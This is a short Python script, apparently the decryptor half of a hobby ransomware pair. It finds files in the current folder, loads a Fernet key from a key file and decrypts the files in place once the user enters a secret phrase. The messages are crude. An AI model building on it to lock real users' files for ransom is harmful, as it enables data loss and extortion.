import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
    if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py" or file == "keys.txt":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("./keys/thekey.key", "rb") as key:
    secretkey = key.read()

secretphrase = ""

user_phrase = input("Enter the secret phrase to decrypt your files : ")
if user_phrase == secretphrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
    print("Congrats, you're files are decrypted. Go get some bitches")
else:
    print("you will never get bitches")
